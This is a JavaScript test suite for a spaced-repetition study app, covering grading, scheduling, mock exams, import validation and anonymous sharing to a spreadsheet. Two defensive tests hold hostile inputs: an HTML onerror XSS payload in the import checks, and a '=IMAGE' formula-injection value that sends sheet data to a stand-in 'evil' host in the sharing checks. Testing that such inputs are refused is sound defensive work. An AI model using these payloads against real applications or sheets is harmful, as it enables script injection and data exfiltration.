// Tests for engine.js. Run: node engine.test.js (exit 1 on failure).
"use strict";
const E = require("./engine.js");
let fails = 0;
function ok(name, cond) { console.log(`${cond ? "PASS" : "FAIL"} ${name}`); if (!cond) fails++; }

// grading
ok("mc: listed letter right", E.grade({ format: "mc", answer: ["C"] }, "C") === 1);
ok("mc: other letter wrong", E.grade({ format: "mc", answer: ["C"] }, "A") === 0);
ok("mc: either accepted letter right", E.grade({ format: "mc", answer: ["A", "B"] }, "B") === 1);
const num = { format: "num", num: { value: 2.58, tol: 0.01 } };
ok("num: within tolerance", E.grade(num, "2.585") === 1);
ok("num: outside tolerance", E.grade(num, "2.6") === 0);
ok("num: full-width digits and comma", E.parseNumber("１,２００") === 1200);
ok("num: percent", E.parseNumber("95%") === 0.95);
ok("num: fraction", Math.abs(E.parseNumber("1/3") - 0.3333) < 1e-3);
ok("num: garbage is NaN", Number.isNaN(E.parseNumber("abc")));
const pct = { format: "num", num: { value: 23, unit: "%" } };
ok("num %: plain number", E.grade(pct, "23") === 1);
ok("num %: with percent sign", E.grade(pct, "23%") === 1);
ok("num %: proportion is not the percent", E.grade(pct, "0.23") === 0);
ok("num: default tolerance", E.grade({ format: "num", num: { value: 100 } }, "100.4") === 1);

// confidence: moves the schedule, not the score
ok("sure right promotes", E.schedule({ box: 2 }, true, 0, 1).box === 3);
ok("unsure right keeps the box", E.schedule({ box: 2 }, true, 0, 0).box === 2);
ok("unsure right on a new card comes back in a day", E.schedule(null, true, 0, 0).box === 1);
ok("wrong resets either way", E.schedule({ box: 4 }, false, 0, 1).box === 0 && E.schedule({ box: 4 }, false, 0, 0).box === 0);
ok("schedule without sure promotes as before", E.schedule({ box: 2 }, true, 0).box === 3);
ok("confident wrong retried soon", E.retryAt(10, 1) === 3 && E.retryAt(2, 1) === 2);
ok("unsure wrong retried at the end", E.retryAt(10, 0) === 10);

// essays
const essay = { format: "essay", points: [{ t: "隨機", kw: ["隨機抽樣", "random"] }, { t: "代表性", kw: ["代表性"] }] };
ok("keyword hit", E.matchPoints(essay, "採用隨機抽樣以確保代表性").join() === "true,true");
ok("negated keyword not hit", E.matchPoints(essay, "這不是隨機抽樣").join() === "false,false");
ok("非常 is not a negation", E.keywordHit("非常有代表性", "代表性"));
ok("case and width ignored", E.keywordHit("Simple RANDOM sample", "random"));
ok("essay score is the ticked share", E.grade(essay, [true, false]) === 0.5);
ok("essay passes at 0.6 by default", !E.passed(essay, 0.5) && E.passed(essay, 1));

// ability: a right answer raises it, more for a harder card
const m1 = {}, m2 = {};
E.updateAbility(m1, { ch: 3, level: 1 }, 1); E.updateAbility(m2, { ch: 3, level: 3 }, 1);
ok("right answer raises ability", m1.theta["3"] > 0);
ok("harder card raises it more", m2.theta["3"] > m1.theta["3"]);
const m3 = {}; E.updateAbility(m3, { ch: 3, level: 2 }, 0);
ok("wrong answer lowers ability", m3.theta["3"] < 0);

// new cards: a beginner meets basic ones first, a strong learner standard or advanced ones
const cards = [1, 2, 3].flatMap(l => Array.from({ length: 5 }, (_, i) => ({ id: `${l}-${i}`, ch: 5, level: l })));
const pick = model => E.buildRound(cards, { progress: {}, model }, { now: 0, cap: 5, random: () => 0 }).fresh;
ok("beginner gets basic cards", pick({}).every(c => c.level === 1));
ok("strong learner gets harder cards", pick({ theta: { 5: 1.5 } }).every(c => c.level >= 2));
const due = E.buildRound(cards, { progress: { "1-0": { due: 0 }, "1-1": { due: 9e15 } } }, { now: 1, cap: 0 });
ok("only due seen cards return", due.seen.map(c => c.id).join() === "1-0");

// a scheduled round sized to today's budget: most-forgotten reviews, a protected share of new cards
// spread between them (2026-10-16: every due card plus new ones ran past the daily limit)
{
  const D = E.DAY, now = 100 * D, labels = ["甲", "乙", "丙", "丁"];
  const pool = Array.from({ length: 500 }, (_, i) => ({ id: `p${i}`, ch: 5, level: 2, label: labels[i % 4] }));
  const progress = {};
  // 200 due reviews: p0..p199, the higher the number the longer overdue (seen at box 2, 3-day interval),
  // so deck order would pick the least overdue
  for (let i = 0; i < 200; i++) progress[`p${i}`] = { box: 2, due: now - (i + 1) * 3600e3, log: [[now - 3 * D - (i + 1) * 3600e3, 1, 0]] };
  const st = { progress, model: {} }, plan = o => E.planRound(pool, st, { now, cap: 15, random: () => 0.5, ...o });
  const r = plan({ size: 60 }), isNew = c => !progress[c.id];
  const nNew = r.list.filter(isNew).length;
  ok("round: fits the day's remaining limit", r.list.length === 60 && r.review === 60 - nNew);
  ok("round: backlog still leaves a fifth for new cards", nNew === Math.ceil(60 * E.NEW_SHARE));
  const reviewIds = r.list.filter(c => !isNew(c)).map(c => Number(c.id.slice(1)));
  ok("round: the most overdue reviews come first", Math.min(...reviewIds) >= 200 - (60 - nNew));
  ok("forgetting curve: half recall when due, less when overdue",
     Math.abs(E.recall({ box: 2, log: [[0, 1, 0]] }, 3 * D) - 0.5) < 1e-9 && E.recall({ box: 2, log: [[0, 1, 0]] }, 6 * D) < 0.5);
  const pos = r.list.map((c, i) => (isNew(c) ? i : -1)).filter(i => i >= 0);
  ok("round: opens on a review, new cards spread out", !isNew(r.list[0]) && pos.every((p, k) => !k || p - pos[k - 1] >= 3));
  ok("round: no domain twice in a row", r.list.every((c, i) => !i || c.label !== r.list[i - 1].label));
  ok("round: at or past the limit, the EXTRA the pause offers", plan({ size: -5 }).list.length === E.EXTRA);
  ok("round: slowed learning caps new cards", plan({ size: 60, cap: 5 }).list.filter(isNew).length === 5);
  const light = E.planRound(pool, { progress: { p0: progress.p0 }, model: {} }, { now, cap: 15, size: 60 });
  ok("round: few reviews, new cards up to the adaptive cap", light.list.length === 16 && light.review === 1);
}

// volume
const log = (n, right) => ({ c: { log: Array.from({ length: n }, (_, i) => [i, right, 0]) } });
const up = E.adjustVolume({}, log(12, 1), 5, 15), down = E.adjustVolume({}, log(12, 0), 5, 15);
ok("high accuracy adds new cards", up.newPerRound === 20);
ok("low accuracy removes new cards", down.newPerRound === 10);
ok("waits for enough new attempts", E.adjustVolume(up, log(15, 1), 5, 15).newPerRound === 20);
ok("many due reviews hold new cards back", E.adjustVolume({}, log(12, 1), 80, 15).newPerRound === 10);
ok("never below the minimum", E.adjustVolume({ newPerRound: 5 }, log(12, 0), 5, 15).newPerRound === 5);
ok("essay partial scores count", E.recentScores({ c: { log: [[1, 0, 0, 0.5]] } }, 5)[0] === 0.5);

// guessing and tolerance
const mc4 = { format: "mc", level: 2, choices: [["A"], ["B"], ["C"], ["D"]] };
ok("mc expected success has a 1/4 floor", Math.abs(E.expected(-10, mc4) - 0.25) < 1e-3);
ok("non-mc has no floor", E.expected(-10, { format: "flip", level: 2 }) < 0.01);
const mA = {}, mB = {};
E.updateAbility(mA, mc4, 1); E.updateAbility(mB, { format: "flip", level: 2 }, 1);
ok("a right mc answer counts less than a right recall", mA.theta.undefined < mB.theta.undefined);
ok("small values get a tight default tolerance", E.grade({ format: "num", num: { value: 0.003 } }, "0.008") === 0);
ok("rounded small values still pass", E.grade({ format: "num", num: { value: 0.0456 } }, "0.046") === 1);

// import validation: whole file accepted or refused, never half-read
const good = { schemaVersion: 2, progress: { a: { box: 1, due: 5, log: [[1, 1, 0], [2, 0, 1, 0.5]] } }, mine: [], essays: { a: [] }, model: { theta: { 3: 0.2 } } };
ok("valid export passes", E.validateExport(good).length === 0);
ok("old export without version passes", E.validateExport({ progress: { a: { box: 0, due: 0, log: [[1, 1, 0]] } } }).length === 0);
ok("newer version refused", E.validateExport({ ...good, schemaVersion: E.EXPORT_VERSION + 1 }).some(m => m.includes(`v${E.EXPORT_VERSION + 1}`)));
ok("broken attempt refused", E.validateExport({ progress: { a: { box: 0, due: 0, log: [[1, 2, 0]] } } }).length === 1);
ok("missing log refused", E.validateExport({ progress: { a: { box: 0, due: 0 } } }).length === 1);
ok("score above 1 refused", E.validateExport({ progress: { a: { box: 0, due: 0, log: [[1, 1, 0, 1.5]] } } }).length === 1);
ok("not an export refused", E.validateExport({ hello: 1 }).length === 1 && E.validateExport(null).length === 1);
ok("non-numeric ability refused", E.validateExport({ ...good, model: { theta: { 3: "x" } } }).length === 1);
// a mine card made in the app imports; one carrying render-routing fields (format/num/choices) is
// refused -- that is the stored-XSS vector (a crafted num.value reaching an unescaped result line)
ok("export: a normal mine card imports",
  E.validateExport({ ...good, mine: [{ id: "mine-1", chapter: "c1", label: "L", q: "Q", a: "A", created: 1 }] }).length === 0);
ok("export: mine card with a format/num payload refused (XSS)",
  E.validateExport({ ...good, mine: [{ id: "m1", format: "num", q: "1+1?", a: "2",
    num: { value: '<img src=x onerror=alert(1)>', unit: "" } }] }).length === 1);
ok("export: mine card with an unknown field refused",
  E.validateExport({ ...good, mine: [{ id: "m1", q: "Q", a: "A", choices: [["A", "<img>"]] }] }).length === 1);
ok("export: mine card with a non-string q refused",
  E.validateExport({ ...good, mine: [{ id: "m1", q: 5, a: "A" }] }).length === 1);

// rounds: go through everything, summary, today's numbers, mastery groups
{
  const cs = [{ id: "a", ch: 1 }, { id: "b", ch: 1 }, { id: "c", ch: 1 }, { id: "d", ch: 1 }];
  const st = { progress: { a: { box: 1, due: 5 }, b: { box: 3, due: 50 }, c: { box: 2, due: 20 } }, model: {} };
  const ids = E.fullPass(cs, st, { now: 10, random: () => 0 }).map(c => c.id).join("");
  ok("full pass: every card once, due then new then soonest due", ids === "adcb");
  const s = E.summarize([{ id: "a", label: "CH1", right: true, sure: 1 }, { id: "b", label: "CH1", right: false, sure: 1 },
                         { id: "c", label: "CH2", right: true, sure: 0 }, { id: "d", label: "CH2", right: false, sure: 0 }]);
  ok("summary: score and groups", s.n === 4 && s.right === 2 && s.pct === 50 && s.unsureRight === 1 &&
     s.sureWrong.join() === "b" && s.missed.join() === "b,d" && s.byLabel.map(b => `${b.label}${b.right}/${b.n}`).join() === "CH11/2,CH21/2");
  ok("summary: empty round", E.summarize([]).pct === 0);
  const d = E.since({ x: { log: [[5, 1, 1], [15, 1, 1], [16, 0, 1]] }, y: { log: [[20, 1, 0]] } }, 10);
  // a retry of a missed card is not a second card, and the rate is first attempts only (2026-10-13)
  ok("today: distinct cards, first attempt", d.n === 2 && d.right === 2 && d.pct === 100 && d.attempts === 3);
  const many = {};
  for (let i = 0; i < 24; i++) many["c" + i] = { log: [[100 + i, i < 10 ? 1 : 0, 1]] };
  const t = E.since(many, 0);
  ok("today: 24 cards, recent 20 at 30%", t.n === 24 && t.recentN === 20 && t.recentPct === 30);
  ok("pause: low accuracy", E.pauseReason(t, null, 60).code === "low");
  ok("pause: not again right after it was acknowledged", E.pauseReason(t, { at: 24 }, 60) === null);
  ok("pause: daily limit", E.pauseReason({ ...t, recentPct: 90 }, null, 24).code === "limit");
  ok("pause: limit raised by the learner", E.pauseReason({ ...t, recentPct: 90 }, { limit: 44 }, 24) === null);
  ok("pause: none on a good day", E.pauseReason({ n: 10, attempts: 10, recentN: 10, recentPct: 40 }, null, 60) === null);
  const numCard = { format: "num", num: { value: 0.23 } };
  ok("diagnose: percent for proportion", E.diagnose(numCard, "23", false, 1) === "pct");
  ok("diagnose: sign", E.diagnose({ format: "num", num: { value: -1.5 } }, "1.5", false, 1) === "sign");
  ok("diagnose: rounding", E.diagnose({ format: "num", num: { value: 2.138 } }, "2.1", false, 1) === "round");
  ok("diagnose: other numbers", E.diagnose(numCard, "0.5", false, 1) === "calc");
  ok("diagnose: tagged trap", E.diagnose({ format: "mc", traps: { B: "S06" } }, "B", false, 0) === "trap");
  ok("diagnose: confident miss", E.diagnose({ format: "mc" }, "C", false, 1) === "sure");
  ok("diagnose: right answers have none", E.diagnose(numCard, "0.23", true, 1) === null);
  ok("diagnose: every code has a question", Object.values(E.DIAG).every(x => x.name && /？|。$/.test(x.ask)));
  const w = E.summarize([{ id: 1, label: "CH3", type: "找錯", right: false, sure: 1, diag: "sure" },
                         { id: 2, label: "CH3", type: "找錯", right: false, sure: 0, diag: "pct", trap: "S01" },
                         { id: 3, label: "CH4", type: "定義辨識", right: true, sure: 1 }]);
  ok("summary: weak areas and diagnoses", w.weakLabels[0].label === "CH3" && w.weakTypes[0].label === "找錯" &&
     w.diags.sure === 1 && w.diags.pct === 1 && w.traps.S01 === 1 && w.weakLabels.length === 1);
  const m = E.mastery(cs, st.progress);
  ok("mastery groups", m.unseen === 1 && m.learning === 2 && m.mastered === 1);
}

/// v3 attempts keep the answer given, so a wrong pick can be traced to its misconception
ok("attempt: mc keeps the letter", JSON.stringify(E.attempt(5, false, 1, 0, "B")) === "[5,0,1,0,\"B\"]");
ok("attempt: flip has no answer field", JSON.stringify(E.attempt(5, true, 0, 1, "")) === "[5,1,0]");
ok("attempt: essay keeps a partial score only", JSON.stringify(E.attempt(5, true, 1, 0.75)) === "[5,1,1,0.75]");
ok("attempt: typed number trimmed and capped", E.attempt(5, false, 1, 0, "  " + "9".repeat(60)).at(-1).length === 40);
ok("export v3: answer field accepted", E.validateExport({ schemaVersion: 3, progress: { a: { box: 0, due: 0, log: [[1, 0, 1, 0, "C"]] } } }).length === 0);
ok("export: an answer that is not text is refused", E.validateExport({ schemaVersion: 3, progress: { a: { box: 0, due: 0, log: [[1, 0, 1, 0, 3]] } } }).length === 1);
ok("export: v2 files still import", E.validateExport({ schemaVersion: 2, progress: { a: { box: 0, due: 0, log: [[1, 1, 1]] } } }).length === 0);

// mock exams: scope, sections in order, formats, no card twice, shortfalls reported
{
  const pool = [{ id: "m1", ch: 2, format: "mc" }, { id: "m2", ch: 3, format: "mc" }, { id: "m3", ch: 6, format: "mc" },
                { id: "n1", ch: 2, format: "num" }, { id: "f1", ch: 4 }, { id: "x1", chapter: "4T1", format: "num" }];
  const spec = { scope: { ch: [1, 2, 3, 4] }, sections: [{ name: "選擇", n: 2, formats: ["mc"] }, { name: "計算", n: 2, formats: ["num"] },
                                                          { name: "簡答", n: 1, formats: ["flip", "essay"] }] };
  const ex = E.buildExam(pool, spec, () => 0);
  ok("exam: scope and formats", ex.ids.length === 4 && !ex.ids.includes("m3") && !ex.ids.includes("x1"));
  ok("exam: section order", ex.section[ex.ids[0]] === "選擇" && ex.section[ex.ids[2]] === "計算" && ex.section[ex.ids[3]] === "簡答");
  ok("exam: shortfall reported", ex.short.join() === "計算 1/2");
  const byPrefix = E.buildExam(pool, { scope: { chapters: ["4T"] }, sections: [{ name: "判讀", n: 3, formats: ["num"] }] }, () => 0);
  ok("exam: chapter-code scope", byPrefix.ids.join() === "x1");
  // spread: one per chapter before any chapter gives a second; pending sections say so instead of n/m
  const many = ["2M1", "2M1", "2M1", "2M2", "2M3"].map((chapter, i) => ({ id: `s${i}`, chapter, format: "mc" }));
  const sp = E.buildExam(many, { spread: true, sections: [{ name: "選擇", n: 3, formats: ["mc"] },
                                                         { name: "是非", n: 5, formats: ["truefalse"], pending: true }] }, () => 0);
  ok("exam: spread across chapters", new Set(sp.ids.map(id => many.find(c => c.id === id).chapter)).size === 3);
  ok("exam: pending section named", sp.short.join() === "是非（題庫建置中）");
  const s = E.summarize([{ id: 1, section: "選擇", right: true }, { id: 2, section: "選擇", right: false }, { id: 3, section: "計算", right: true }]);
  ok("exam: score by section", s.bySection.map(b => `${b.label}${b.right}/${b.n}`).join() === "選擇1/2,計算1/1");
}

// domains: long-term level, error-weighted new cards, interleaving
{
  const log = bits => ({ box: 0, due: 0, log: bits.map((b, i) => [i, b, 1]) });
  const dc = [{ id: "a1", label: "A" }, { id: "a2", label: "A" }, { id: "b1", label: "B" }, { id: "c1", label: "C" }, { id: "d1", label: "D" }];
  const st = E.domainStats(dc, { a1: log([1, 1, 0]), a2: log([1]), b1: log([1, 1, 1]), c1: log([1, 0]) });
  const by = Object.fromEntries(st.map(s => [s.label, s]));
  ok("domain: attempts pooled over a domain's cards", by.A.n === 4 && by.A.wrong === 1 && by.A.err === 0.25 && by.A.level === "熟悉");
  ok("domain: all right is 精熟", by.B.level === "精熟");
  ok("domain: under MIN_SAMPLE is sparse, no rate", by.C.sparse && by.C.err === null && by.C.level === "嘗試");
  ok("domain: never answered", by.D.level === "未開始" && by.D.n === 0);
  ok("domain: only the last 10 attempts", E.domainStats([{ id: "x", label: "X" }], { x: log([0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]) })[0].level === "精熟");
  const weak = { label: "W", sparse: false, err: 0.8 }, fine = { label: "F", sparse: false, err: 0 };
  const ranked = [];
  for (let i = 0; i < 10; i++) ranked.push({ id: "f" + i, label: "F", level: 2 }, { id: "w" + i, label: "W", level: i < 5 ? 2 : 1 });
  const got = E.pickFresh(ranked, [weak, fine], 8);
  const nW = got.filter(c => c.label === "W").length;
  ok("pickFresh: weak domain gets more slots, at most half", nW === 4 && got.length === 8);
  ok("pickFresh: weak domain gives basic cards first", got.filter(c => c.label === "W").every(c => c.level === 1));
  ok("pickFresh: fills from one domain when the others run out", E.pickFresh(ranked.filter(c => c.label === "W").concat(ranked[0]), [weak, fine], 6).length === 6);
  ok("pickFresh: one domain keeps the ranked order", E.pickFresh(ranked.filter(c => c.label === "F"), [], 3).map(c => c.id).join() === "f0,f1,f2");
  const mixed = ["A", "A", "A", "B", "B", "C"].map((label, i) => ({ id: i, label }));
  const order = E.interleave(mixed).map(c => c.label).join("");
  ok("interleave: no domain twice in a row when avoidable", !/(.)\1/.test(order) && order.length === 6);
}

// anonymous sharing: what the app sends is exactly what the Apps Script accepts
{
  const fs = require("fs"), vm = require("vm"), path = require("path");
  const gs = {};
  vm.runInNewContext(fs.readFileSync(path.join(__dirname, "apps-script", "Code.gs"), "utf8"), gs);
  const id = "0123456789abcdef", install = "fedcba9876543210";
  const t = new Date(2026, 9, 14, 23, 59).getTime();
  const mc = E.shareRow("stats", { id: "c04-bank-1a2b3c4d", format: "mc", level: 2 }, [t, 1, 0, 1, "C"], true, id, install);
  ok("share: day only, no time of day", mc.day === "2026-10-14" && !JSON.stringify(mc).includes(String(t)));
  ok("share: letter picked kept", mc.answer === "C" && mc.first === 1 && mc.level === 2);
  const essay = E.shareRow("research", { id: "e-1", format: "essay" }, [t, 0, 1, 0.4, "我的名字是…"], false, id, install);
  ok("share: written text never sent", essay.answer === "" && essay.score === 0.4 && essay.level === 2);
  const flip = E.shareRow("stats", { id: "f-1" }, [t, 1, 1], false, id, install);
  ok("share: old three-field attempts", flip.score === 1 && flip.answer === "");
  ok("share: Apps Script accepts every row the app makes", [mc, essay, flip].every(gs.validRow));
  ok("share: extra field refused", !gs.validRow({ ...mc, name: "x" }));
  ok("share: missing field refused", !gs.validRow((({ answer, ...rest }) => rest)(mc)));
  ok("share: bad install code refused", !gs.validRow({ ...mc, install: "Alice" }));
  ok("share: long answer refused", !gs.validRow({ ...mc, answer: "x".repeat(41) }));
  const mixed = gs.acceptedRows({ rows: [mc, { ...flip, install: "1111111111111111" }, { ...essay, right: 2 }] });
  ok("share: one install code per request, invalid rows dropped", mixed.length === 1 && mixed[0] === mc);
  // V3: a leading "=" answer would run as a Google Sheets formula (=IMAGE exfiltration) -- refused
  ok("share: formula-injection answer refused", !gs.validRow({ ...mc, answer: '=IMAGE("//evil/"&A1)' }));
  ok("share: negative-number answer still accepted", gs.validRow({ ...mc, answer: "-5" }));
  // V4: a global per-window cap exists alongside the per-install cap (rotating install codes bypass that one)
  ok("share: a global cap is enforced, not only the per-install cap", gs.GLOBAL_CAP > 0 && gs.GLOBAL_CAP < Infinity);
}

// exam progress (stage A): tiers fixed in advance, no tier without history, sure-but-wrong lifts 穩 to 注意
{
  const D1 = E.DAY, now = 100 * D1, exam = now + 10 * D1;
  const cards = [{ id: "a" }, { id: "b" }, { id: "c" }, { id: "d" }];
  const none = E.examProgress(cards, {}, exam, now);
  ok("progress: no history gives no tier", none.tier === null && none.work === 4 && none.daysLeft === 10);
  // 2 cards a day for 7 days -> pace 2; work 4 over 10 days -> ratio 0.2 -> 穩
  const log = d => [[now - d * D1, 1, 0]];
  const calm = { a: { box: 1, due: now, log: [...log(1), ...log(2), ...log(3)] }, b: { box: 3, due: exam + D1, log: log(1) },
    x: { box: 1, due: now, log: [...log(1), ...log(2), ...log(3), ...log(4), ...log(5), ...log(6)] } };
  const p = E.examProgress(cards, calm, exam, now);
  ok("progress: work counts unmastered and due-before-exam cards", p.notLearned === 3 && p.dueBefore === 0 && p.work === 3);
  ok("progress: pace is distinct cards per day over 7 days", p.pace === 1.4 && p.tier === "穩" && !p.unstable);
  const sureWrong = { ...calm, a: { ...calm.a, log: [[now - D1, 0, 1], [now - 2 * D1, 0, 1]] } };
  ok("progress: sure-but-wrong over 20% is at least 注意", E.examProgress(cards, sureWrong, exam, now).tier === "注意");
  const late = E.examProgress(cards, { a: { box: 1, due: now, log: log(1) } }, now + D1, now);
  ok("progress: more work than capacity is 危險", late.tier === "危險" && late.perDay === 4 && late.unstable);
  ok("progress: exam passed gives 0 days", E.examProgress(cards, calm, now - D1, now).daysLeft === 0);
  // imported records older than 7 days: 6 distinct card-days over a 3-day span -> pace 2, not 0
  const old = { a: { box: 1, due: now, log: [[now - 30 * D1, 1, 0]] }, b: { box: 1, due: now, log: [[now - 30 * D1, 1, 0], [now - 28 * D1, 1, 0]] },
    c: { box: 1, due: now, log: [[now - 28 * D1, 0, 0]] }, d: { box: 1, due: now, log: [[now - 29 * D1, 1, 0], [now - 28 * D1, 1, 0]] } };
  const imp = E.examProgress(cards, old, exam, now);
  ok("progress: no recent attempts uses the whole-history pace", imp.paceFrom === "all" && imp.pace === 2 && imp.tier === "穩");
  ok("progress: recent attempts keep the 7-day pace", p.paceFrom === "recent");
}

// three 危險 rounds in a row (exam rounds skipped, a round without a tier breaks the streak)
{
  const r = tier => ({ t: 1, tier }), x = { t: 1, exam: true };
  ok("streak: three 危險 rounds, an exam round between", E.dangerStreak([r("穩"), r("危險"), r("危險"), x, r("危險")]));
  ok("streak: two are not enough", !E.dangerStreak([r("危險"), r("危險")]));
  ok("streak: a calmer round breaks it", !E.dangerStreak([r("危險"), r("注意"), r("危險"), r("危險")]));
  ok("streak: old rounds without a tier do not count", !E.dangerStreak([{ t: 1 }, r("危險"), r("危險")]));
}

// service worker: pages and cards must be revalidated, or a phone keeps yesterday's engine.js from
// the browser's HTTP cache even when online (2026-10-12: a new grading rule did not load)
const sw = require("fs").readFileSync(require("path").join(__dirname, "sw.js"), "utf8");
ok("sw: fresh files fetched with no-cache", /fetch\(event\.request,\s*\{\s*cache:\s*"no-cache"\s*\}\)/.test(sw));

// portraits: every file in img/ is cached offline, each at most 30 KB (改善規劃.md cost check), and every
// voice in a deck points at one of them, carries a sourced quote and a text for a 危險 streak
{
  const fs = require("fs"), path = require("path");
  const listed = [...sw.match(/const PORTRAITS = \[([^\]]*)\]/)[1].matchAll(/"([\w-]+)"/g)].map(m => `img/${m[1]}.webp`).sort();
  const files = fs.readdirSync(path.join(__dirname, "img")).map(f => `img/${f}`).sort();
  ok("portraits: sw.js list matches img/", JSON.stringify(listed) === JSON.stringify(files));
  ok("portraits: each at most 30 KB", files.every(f => fs.statSync(path.join(__dirname, f)).size <= 30 * 1024));
  for (const deck of ["cards.json", "cards-theory.json"]) {
    const doc = JSON.parse(fs.readFileSync(path.join(__dirname, deck), "utf8")), vs = Object.values(doc.voices || {});
    ok(`voices: ${deck} has voices`, vs.length > 0);
    ok(`voices: ${deck} portraits exist`, vs.every(v => files.includes(v.img)));
    ok(`voices: ${deck} quotes carry text, translation and source`, vs.every(v => v.quote && v.quote.text && v.quote.zh && v.quote.src));
    ok(`voices: ${deck} streak advice present`, vs.every(v => v.streak));
    ok(`voices: ${deck} portraits listed in sources`, vs.every(v => (doc.sources || []).some(s => (s.name || "").includes(v.name) && /^https:\/\/commons\.wikimedia\.org\//.test(s.url || ""))));
  }
}

console.log(`${fails} failed`);
process.exit(fails ? 1 : 0);
